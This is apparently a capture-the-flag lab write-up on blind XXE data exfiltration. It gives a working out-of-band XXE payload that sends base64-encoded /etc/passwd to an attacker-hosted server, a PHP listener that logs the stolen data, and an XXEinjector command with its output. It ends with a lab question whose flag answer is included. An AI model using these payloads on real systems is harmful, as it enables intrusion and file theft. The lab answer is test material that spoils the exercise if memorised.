# Blind Data Exfiltration
## Out-of-band Data Exfiltration
Host this XXE payload:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

```sh
$ cat index.php # here we write the above PHP code
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Send this to target to make it reference our DTD:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## Automated OOB Exfiltration

```sh
$ git clone https://github.com/enjoiz/XXEinjector.git
```

Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host/--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

```sh
$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:

```sh
$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

## Questions
1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag. **Answer: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}**
   - Use XXEInjector to automate this attack:
        ```sh
        $ ruby ~/XXEinjector/XXEinjector.rb --host=10.10.14.205 --httpport=8000 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
        XXEinjector by Jakub Pałaczyński

        Enumeration options:
        "y" - enumerate currect file (default)
        "n" - skip currect file
        "a" - enumerate all files in currect directory
        "s" - skip all files in currect directory
        "q" - quit

        [-] Multiple instances of XML found. It may results in false-positives.
        [+] Sending request with malicious XML.
        [+] Responding with XML for: /327a6c4304ad5938eaf0efb6cc3e53dc.php
        [+] Retrieved data:
        [+] Nothing else to do. Exiting.
        ```
   - Read the exfiltrated file:
        ```sh
        # Log folder is created where we run the tool
        $ cat ~/Logs/10.129.234.170/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
        <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
        ```